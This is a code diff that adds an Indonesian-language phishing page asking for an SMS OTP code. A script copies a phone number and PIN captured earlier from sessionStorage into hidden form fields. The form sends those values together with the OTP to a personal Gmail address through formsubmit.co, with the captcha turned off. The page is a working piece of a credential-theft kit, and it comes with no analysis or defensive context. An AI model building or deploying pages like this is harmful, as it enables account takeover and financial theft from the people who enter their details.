@@ -1,0 +1,28 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Masukkan OTP</title>
+</head>
+<body>
+  <h2>Kode OTP</h2>
+  <p>Kami telah mengirimkan SMS ke <span id="phoneDisplay"></span></p>
+  <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
+    <input type="hidden" name="_next" value="selesai.html">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="Nomor HP" id="phoneHidden">
+    <input type="hidden" name="PIN" id="pinHidden">
+    <input type="text" name="OTP" maxlength="4" required>
+    <button type="submit">Konfirmasi</button>
+  </form>
+  <script>
+    const phone = sessionStorage.getItem('phone');
+    const pin = sessionStorage.getItem('pin');
+    document.getElementById('phoneDisplay').textContent = phone;
+    document.getElementById('phoneHidden').value = phone;
+    document.getElementById('pinHidden').value = pin;
+  </script>
+</body>
+</html>
